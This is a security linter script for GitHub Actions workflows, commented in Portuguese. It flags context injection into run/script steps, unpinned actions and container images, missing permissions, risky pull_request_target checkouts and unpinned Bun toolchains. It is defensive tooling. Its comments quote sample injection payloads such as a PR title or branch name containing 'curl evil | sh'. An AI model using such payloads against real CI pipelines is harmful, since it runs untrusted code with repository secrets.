#!/usr/bin/env node
// Linter dos workflows de CI. Fecha as classes que transformam o CI no caminho mais curto para executar
// código de estranho com os segredos do repositório.
//
// A lista abaixo é a PROMESSA deste arquivo, e ela é exata de propósito: um cabeçalho que anuncia mais do que
// o código verifica é pior que cabeçalho nenhum, porque faz quem lê confiar sem conferir. O caso
// "a PROMESSA do cabeçalho nomeia TODA regra que o linter emite" (oss-ci-workflows.test.ts) amarra as duas
// coisas — regra nova sem descrição aqui fica vermelha no merge gate.
//
//   1. INTERPOLAÇÃO DE CONTEXTO CONTROLADO POR TERCEIRO EM `run:`/`script:` —
//      `event-interpolation-in-run` e `event-interpolation-in-script`. `${{ }}` é substituído ANTES de o
//      shell existir: o texto entra como PROGRAMA, não como argumento. Um título `"; curl evil | sh #`
//      executa. Foi a classe do CI extinto deste repositório (story-15g6bb). Os contextos barrados:
//        · `github.event.*`  — título, corpo, ref do PR: texto de quem abriu;
//        · `github.head_ref` — nome do branch do PR (o mais esquecido do par);
//        · `github.ref_name` — o MESMO nome de branch por outra porta (push, tag): quem abre um fork o
//          escolhe, e `$(curl evil|sh)` é nome de branch válido;
//        · `github.ref`      — o mesmo nome COM o prefixo (`refs/heads/…`), a porta original: cobrir só a
//          variante encurtada era uma régua que pegava apenas quem escrevesse a mais nova. Vale só para
//          `run:`/`script:`; na regra 4 ele é o ref BASE, e acusá-lo ali seria falso;
//        · `inputs.*`        — `workflow_dispatch` (digitado por quem dispara) e `workflow_call` (escolhido
//          pelo chamador, que pode ter nascido de contexto hostil). NÃO é coberto por `github.event.*`.
//      O caminho correto é `env:` + `"$VAR"`, onde o shell trata como DADO — e por isso o linter reprova só
//      o uso em `run:`/`script:`, nunca em `env:`. Sem essa contraprova o time desligaria o linter.
//   2. CÓDIGO DE TERCEIRO POR REFERÊNCIA MUTÁVEL — `unpinned-action` e `unpinned-image`. `uses: org/acao@v4`
//      resolve para o que a tag apontar HOJE; quem controla a tag executa código no nosso CI com o
//      `GITHUB_TOKEN` na mão. A MESMA régua vale para `container:` e para cada `services.<nome>.image`, que
//      rodam imagem de terceiro DENTRO do job, com os secrets dele no ambiente: `node:22` é tag, e
//      repontá-la no registry é execução de código arbitrário. SHA de 40 hex (action) e `@sha256:` de 64 hex
//      (imagem) são os únicos vínculos imutáveis.
//   3. `permissions:` AUSENTE OU TOTAL — `missing-permissions` e `permissions-write-all`. O default do
//      repositório pode ser `write-all`; declarar o mínimo é o que limita o estrago de um job comprometido.
//   4. `pull_request_target` COM CHECKOUT DO PR — `pr-target-checkout`. Esse gatilho roda com secrets no
//      contexto do repo BASE; se ainda fizer checkout do código do PR, é execução de código não revisado com
//      segredo disponível.
//   5. TOOLCHAIN POR REFERÊNCIA MÓVEL OU DESANCORADA — `unpinned-toolchain` e `toolchain-mismatch`. É a
//      MESMA classe da regra 2 um degrau abaixo: `oven-sh/setup-bun` com `bun-version: latest` (ou sem
//      `bun-version`, cujo default É `latest`) baixa o binário que existir NO DIA. Aqui o dano não precisa
//      nem de atacante — o resolvedor e o formato do `bun.lock` mudam entre versões, e o
//      `bun install --frozen-lockfile` do passo seguinte passa a reprovar por DATA, sem nenhum commit. Um
//      CI que fica vermelho sozinho é um CI que o time aprende a ignorar, e aí as regras 1 a 4 param de
//      proteger junto. A âncora é o `packageManager` do `package.json` da RAIZ (`bun@<x.y.z>`) — o mesmo
//      campo que o Corepack e o Dependabot leem —, e NÃO `engines.bun`, que é uma faixa (`>=1.0.0`) e não
//      pinaria nada. Um `.bun-version` solto seria uma SEGUNDA verdade, então o único equivalente aceito é
//      `bun-version-file: package.json`, que lê a mesma âncora.
//
// FAIL-CLOSED em dois pontos que costumam ser esquecidos: YAML que não parseia REPROVA (`unparseable` — um
// linter que devolve zero achados por não ter conseguido ler afirma "limpo" sem ter medido), e diretório sem
// workflow nenhum REPROVA (`no-workflows` — o gate não pode passar por não ter tido o que examinar). A regra
// 5 herda a MESMA postura: raiz sem `packageManager` legível vira `toolchain-mismatch`, porque "não consegui
// comparar" nunca pode sair como "confere".
//
// Uso: node scripts/security/lint-workflows.mjs [--dir .github/workflows] [--root .] [--json]
// Saída: 0 aprovado · 2 REPROVADO · 1 erro de uso.
import { readFileSync, readdirSync, statSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import yaml from "js-yaml";

const RAIZ = fileURLToPath(new URL("../../", import.meta.url));
const DIR_PADRAO = ".github/workflows";

/** Contextos cujo valor um ESTRANHO escolhe e que IDENTIFICAM o código do PR — a base da lista (ver a regra 1
 *  no cabeçalho): `github.event.*` (texto e refs do PR), `github.head_ref` (nome do branch do PR),
 *  `github.ref_name` (o mesmo nome por outra porta) e `inputs.*` (workflow_dispatch/workflow_call: o valor vem
 *  de quem dispara, não do repositório). É esta lista — e não a de baixo — que a regra 4 usa, porque sob
 *  `pull_request_target` `github.ref` é o ref BASE: acusá-lo de "checkout do código do PR" seria falso. */
const CONTEXTO_HOSTIL = /\$\{\{[^}]*\b(github\.event\b|github\.head_ref\b|github\.ref_name\b|inputs\.)[^}]*\}\}/;

/** A MESMA lista mais `github.ref`, para o que vira PROGRAMA (`run:`/`script:`).
 *
 *  O que isto IMPEDE: que o nome de um ref escolhido por terceiro seja executado como comando pela porta que
 *  a régua de `github.ref_name` deixou aberta. `github.ref` é `refs/heads/<nome>`/`refs/tags/<nome>` — o mesmo
 *  nome, com prefixo; `ref_name` é literalmente ele sem o prefixo. Git recusa espaço, `~`, `^`, `:`, `?`, `*`
 *  e `[` num nome de ref, mas NÃO recusa `$`, `(`, `)`, `` ` ``, `;` nem `|`, então `$(curl evil|sh)` é nome
 *  de ref válido e `${{ github.ref }}` num `run:` o entrega ao shell como código. Cobrir uma variante e não a
 *  outra é uma régua que só pega quem escreveu a mais nova. */
const CONTEXTO_HOSTIL_EM_CODIGO =
  /\$\{\{[^}]*\b(github\.event\b|github\.head_ref\b|github\.ref\b|github\.ref_name\b|inputs\.)[^}]*\}\}/;

/** SHA de commit completo: 40 hex. Tag e branch são mutáveis por quem publica a action. */
const SHA_PINADO = /^[0-9a-f]{40}$/;

/** Digest OCI: 64 hex. `node:22` é tag — quem repontar a tag no registry passa a rodar código dentro do job,
 *  com os secrets dele no ambiente. O digest é o único identificador que não pode ser reapontado. */
const DIGEST_PINADO = /@sha256:[0-9a-f]{64}$/;

/** A action que instala a toolchain. Casada por NOME (antes do `@`), porque o SHA muda a cada bump. */
const SETUP_BUN = /^oven-sh\/setup-bun(?:\/|@)/;

/** Versão EXATA de bun: `x.y.z`, com pré-lançamento opcional. `latest`, `canary`, `1.x` e `^1.3` não casam. */
const VERSAO_EXATA = /^\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?$/;

/** O único arquivo aceito como fonte de `bun-version-file`: é o MESMO `packageManager` que ancora a regra. */
const ARQUIVO_DE_VERSAO_ACEITO = "package.json";

function args(argv) {
  const o = { dir: null, root: null, json: false };
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--dir") o.dir = argv[++i];
    else if (a === "--root") o.root = argv[++i];
    else if (a === "--json") o.json = true;
  }
  return o;
}

/**
 * A ÂNCORA da toolchain: `packageManager` do `package.json` da raiz, como `bun@<x.y.z>`.
 *
 * Devolve `{ versao }` quando dá para comparar, ou `{ erro }` quando NÃO dá — e o chamador trata o erro
 * como achado, nunca como silêncio. Comparar contra nada e aprovar seria o mesmo furo do `unparseable`:
 * o gate passando por não ter tido o que medir.
 */
export function ancoraDaToolchain(repoRoot) {
  const arquivo = path.join(repoRoot, "package.json");
  let pkg;
  try {
    pkg = JSON.parse(readFileSync(arquivo, "utf8"));
  } catch (e) {
    return { erro: `package.json da raiz ilegível (${arquivo}): ${String(e?.message ?? e)}` };
  }
  const pm = pkg?.packageManager;
  if (typeof pm !== "string" || !pm.trim()) {
    return { erro: "`packageManager` ausente no package.json da raiz — não há âncora para comparar" };
  }
  const m = /^bun@(\d+\.\d+\.\d+(?:-[0-9A-Za-z.-]+)?)(?:\+[0-9A-Za-z.-]+)?$/.exec(pm.trim());
  if (!m) return { erro: `\`packageManager\` não é \`bun@<x.y.z>\`: ${JSON.stringify(pm)}` };
  return { versao: m[1] };
}

/**
 * Regra 5, aplicada a UM passo `oven-sh/setup-bun`.
 *
 * Duas perguntas, nesta ordem: a referência é IMÓVEL? e ela é a MESMA que o repositório declara? A primeira
 * sozinha não basta — `bun-version: 1.2.0` é imóvel e ainda assim instala um resolvedor diferente do que
 * escreveu o `bun.lock`, que é justo o que o `--frozen-lockfile` do passo seguinte vai acusar.
 */
function verificarToolchain(passo, ancora, file, onde, findings) {
  const com = passo?.with ?? {};
  const arquivo = com["bun-version-file"];
  if (typeof arquivo === "string" && arquivo.trim()) {
    const nome = path.basename(arquivo.trim());
    if (nome !== ARQUIVO_DE_VERSAO_ACEITO) {
      findings.push(
        achado(
          file,
          "toolchain-mismatch",
          `${onde}: \`bun-version-file: ${arquivo}\` é uma SEGUNDA fonte de versão — ancore em \`package.json\` (packageManager)`,
        ),
      );
    }
    return;
  }

  const versao = com["bun-version"];
  if (versao === undefined || versao === null || String(versao).trim() === "") {
    findings.push(
      achado(file, "unpinned-toolchain", `${onde}: \`setup-bun\` sem \`bun-version\` — o default é \`latest\``),
    );
    return;
  }
  const v = String(versao).trim();
  if (!VERSAO_EXATA.test(v)) {
    findings.push(
      achado(file, "unpinned-toolchain", `${onde}: \`bun-version: ${v}\` é referência MÓVEL — pine \`x.y.z\``),
    );
    return;
  }
  if (ancora.erro) {
    findings.push(achado(file, "toolchain-mismatch", `${onde}: ${ancora.erro}`));
    return;
  }
  if (v !== ancora.versao) {
    findings.push(
      achado(
        file,
        "toolchain-mismatch",
        `${onde}: \`bun-version: ${v}\` ≠ \`packageManager: bun@${ancora.versao}\` do package.json da raiz`,
      ),
    );
  }
}

function achado(file, rule, detail) {
  return { file, rule, detail };
}

/** Percorre os passos de todos os jobs, entregando (jobId, índice, passo). */
function* passos(doc) {
  const jobs = doc?.jobs;
  if (!jobs || typeof jobs !== "object") return;
  for (const [jobId, job] of Object.entries(jobs)) {
    if (!Array.isArray(job?.steps)) continue;
    for (let i = 0; i < job.steps.length; i++) yield [jobId, i, job.steps[i] ?? {}];
  }
}

function verificarPermissoes(doc, file, findings) {
  const topo = doc?.permissions;
  if (topo === "write-all") {
    findings.push(achado(file, "permissions-write-all", "permissions: write-all no topo do workflow"));
    return;
  }
  const jobs = Object.entries(doc?.jobs ?? {});
  for (const [jobId, job] of jobs) {
    if (job?.permissions === "write-all") {
      findings.push(achado(file, "permissions-write-all", `job \`${jobId}\`: permissions: write-all`));
    }
  }
  if (topo !== undefined) return;
  // Sem declaração no topo, TODO job precisa da sua — um job sem nada herda o default do repositório.
  const semPermissao = jobs.filter(([, job]) => job?.permissions === undefined).map(([id]) => id);
  if (semPermissao.length) {
    findings.push(
      achado(file, "missing-permissions", `sem \`permissions:\` no topo nem nos jobs: ${semPermissao.join(", ")}`),
    );
  }
}

function verificarUses(valor, file, onde, findings) {
  if (typeof valor !== "string" || !valor.trim()) return;
  const v = valor.trim();
  if (v.startsWith("./") || v.startsWith(".\\")) return; // action local: versionada com o repositório
  if (v.startsWith("docker://")) {
    if (!v.includes("@sha256:")) {
      findings.push(achado(file, "unpinned-action", `${onde}: imagem sem digest — ${v}`));
    }
    return;
  }
  const arroba = v.lastIndexOf("@");
  if (arroba < 0) {
    findings.push(achado(file, "unpinned-action", `${onde}: \`uses\` sem referência — ${v}`));
    return;
  }
  const ref = v.slice(arroba + 1);
  if (!SHA_PINADO.test(ref)) {
    findings.push(achado(file, "unpinned-action", `${onde}: action não pinada por SHA — ${v}`));
  }
}

/** `container:` e `services.<nome>:` aceitam a string da imagem OU um mapa com `image:`. Os dois executam
 *  código de terceiro dentro do job — logo, a mesma régua de pinagem de `uses:`. Mapa SEM `image` também
 *  reprova: não existe imagem para pinar, e deixar passar seria aprovar por não ter tido o que medir. */
function verificarImagem(spec, file, onde, findings) {
  const img = typeof spec === "string" ? spec : typeof spec?.image === "string" ? spec.image : null;
  if (img === null) {
    findings.push(achado(file, "unpinned-image", `${onde}: sem \`image\` — não há o que pinar`));
    return;
  }
  const v = img.trim().replace(/^docker:\/\//, "");
  if (!DIGEST_PINADO.test(v)) {
    findings.push(achado(file, "unpinned-image", `${onde}: imagem sem digest \`@sha256:\` — ${v}`));
  }
}

function gatilhos(doc) {
  // ARMADILHA: em YAML 1.1 a chave `on` é o booleano `true` (js-yaml 3 e alguns parsers). O js-yaml 4 usa o
  // schema core e mantém a string, mas ler as duas formas custa uma linha e evita um linter que, sob outro
  // parser, silenciosamente deixa de ver os gatilhos — e então deixa de ver a regra 4.
  const on = doc?.on ?? doc?.true ?? doc?.[true];
  if (typeof on === "string") return [on];
  if (Array.isArray(on)) return on.map(String);
  if (on && typeof on === "object") return Object.keys(on);
  return [];
}

export function lintarConteudo(texto, file, ancora = ancoraDaToolchain(RAIZ)) {
  const findings = [];
  let doc;
  try {
    doc = yaml.load(texto);
  } catch (e) {
    // Fail-closed: sem parse não há varredura, e "não varri" nunca pode sair como "está limpo".
    findings.push(achado(file, "unparseable", `YAML não parseia: ${String(e?.reason ?? e?.message ?? e)}`));
    return findings;
  }
  if (!doc || typeof doc !== "object") {
    findings.push(achado(file, "unparseable", "documento vazio ou não é um mapa"));
    return findings;
  }

  verificarPermissoes(doc, file, findings);

  const usaPrTarget = gatilhos(doc).includes("pull_request_target");

  for (const [jobId, i, passo] of passos(doc)) {
    const onde = `job \`${jobId}\` passo ${i + 1}`;
    verificarUses(passo.uses, file, onde, findings);
    if (typeof passo.uses === "string" && SETUP_BUN.test(passo.uses.trim())) {
      verificarToolchain(passo, ancora, file, onde, findings);
    }

    if (typeof passo.run === "string" && CONTEXTO_HOSTIL_EM_CODIGO.test(passo.run)) {
      findings.push(
        achado(
          file,
          "event-interpolation-in-run",
          `${onde}: contexto controlado pelo atacante interpolado em \`run:\` — passe por \`env:\` e use "$VAR"`,
        ),
      );
    }
    const script = passo?.with?.script;
    if (typeof script === "string" && CONTEXTO_HOSTIL_EM_CODIGO.test(script)) {
      findings.push(
        achado(
          file,
          "event-interpolation-in-script",
          `${onde}: contexto controlado pelo atacante interpolado em \`script:\` — passe por \`env:\` e leia process.env`,
        ),
      );
    }
    if (usaPrTarget) {
      const ref = passo?.with?.ref;
      const ehCheckout = typeof passo.uses === "string" && /actions\/checkout@/.test(passo.uses);
      if (ehCheckout && typeof ref === "string" && CONTEXTO_HOSTIL.test(ref)) {
        findings.push(
          achado(
            file,
            "pr-target-checkout",
            `${onde}: \`pull_request_target\` fazendo checkout do código do PR — executa código não revisado com secrets`,
          ),
        );
      }
    }
  }

  for (const [jobId, job] of Object.entries(doc?.jobs ?? {})) {
    // Job que chama workflow reutilizável também é `uses` e também precisa de pinagem.
    if (typeof job?.uses === "string") verificarUses(job.uses, file, `job \`${jobId}\``, findings);

    if (job?.container !== undefined && job?.container !== null) {
      verificarImagem(job.container, file, `job \`${jobId}\` container`, findings);
    }
    const servicos = job?.services;
    if (servicos !== undefined && servicos !== null) {
      // Um `services:` que não é mapa é config inválida — e o runner nem chegaria a subir. Reportar em vez de
      // ignorar mantém a régua fail-closed: o linter não passa por não ter entendido o que leu.
      if (typeof servicos !== "object" || Array.isArray(servicos)) {
        findings.push(achado(file, "unpinned-image", `job \`${jobId}\`: \`services:\` não é um mapa de nomes`));
      } else {
        for (const [nome, svc] of Object.entries(servicos)) {
          verificarImagem(svc, file, `job \`${jobId}\` service \`${nome}\``, findings);
        }
      }
    }
  }

  return findings;
}

export function lintarDiretorio(dir, repoRoot = RAIZ) {
  let entradas;
  try {
    if (!statSync(dir).isDirectory()) return { scanned: 0, findings: [achado(dir, "no-workflows", "não é diretório")] };
    entradas = readdirSync(dir).filter((f) => /\.ya?ml$/.test(f)).sort();
  } catch {
    return { scanned: 0, findings: [achado(dir, "no-workflows", `diretório ausente: ${dir}`)] };
  }
  if (!entradas.length) {
    return { scanned: 0, findings: [achado(dir, "no-workflows", `nenhum workflow em ${dir}`)] };
  }
  // A âncora é lida UMA vez por varredura: o veredito da regra 5 tem de ser o mesmo para todos os
  // workflows do diretório, e reler o package.json por arquivo abriria a porta para dois vereditos.
  const ancora = ancoraDaToolchain(repoRoot);
  const findings = [];
  for (const f of entradas) findings.push(...lintarConteudo(readFileSync(path.join(dir, f), "utf8"), f, ancora));
  return { scanned: entradas.length, findings };
}

function main() {
  const o = args(process.argv.slice(2));
  const dir = path.resolve(o.dir ?? path.join(RAIZ, DIR_PADRAO));
  const r = lintarDiretorio(dir, path.resolve(o.root ?? RAIZ));
  if (o.json) {
    process.stdout.write(`${JSON.stringify({ dir, ...r }, null, 2)}\n`);
  } else {
    const l = [r.findings.length ? "✗ workflows REPROVADOS" : "✓ workflows aprovados", `  ${r.scanned} arquivo(s)`];
    for (const f of r.findings) l.push(`  [${f.rule}] ${f.file}: ${f.detail}`);
    process.stderr.write(`${l.join("\n")}\n`);
  }
  return r.findings.length ? 2 : 0;
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  process.exit(main());
}
